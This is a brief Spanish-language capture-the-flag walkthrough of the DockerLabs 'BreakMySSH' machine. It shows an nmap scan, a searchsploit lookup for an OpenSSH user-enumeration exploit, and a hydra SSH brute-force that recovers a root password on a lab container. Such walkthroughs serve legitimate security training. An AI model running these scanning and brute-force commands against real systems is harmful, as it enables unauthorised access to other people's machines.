# dockerlabs

## BreakMySSH

Hacemos un scan para empezar

```shell
nmap -p- -T4 --min-rate 5000 -sV 172.17.0.2  
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-19 00:42 -03
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
```

Encontramos que tiene OpenSSH 7.7 el cual es suceptible a enumeracion de usuarios por la busqueda de `searchsploit`

```shell
searchsploit OpenSSH
OpenSSH < 7.7 - User Enumeration (2)                                                                                      | linux/remote/45939.py
```

Siendo que el exploit para adivinar el usuario esta bastante viejo en todos lados vamos a intentar con fuerza bruta

Despues de intentar muchas wordlist encontre que las siguientes me dieron un usuario

```shell
hydra -L /usr/share/seclists/Usernames/unix_users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt ssh://172.17.0.2 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 01:23:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 97280 login tries (l:190/p:512), ~6080 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 20793.00 tries/min, 20793 tries in 00:01h, 76491 to do in 00:04h, 12 active
[22][ssh] host: 172.17.0.2   login: root   password: estrella
[STATUS] 20920.67 tries/min, 62762 tries in 00:03h, 34522 to do in 00:02h, 12 active
[STATUS] 20854.00 tries/min, 83416 tries in 00:04h, 13868 to do in 00:01h, 12 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-19 01:28:39
```

De esta forma ya somos root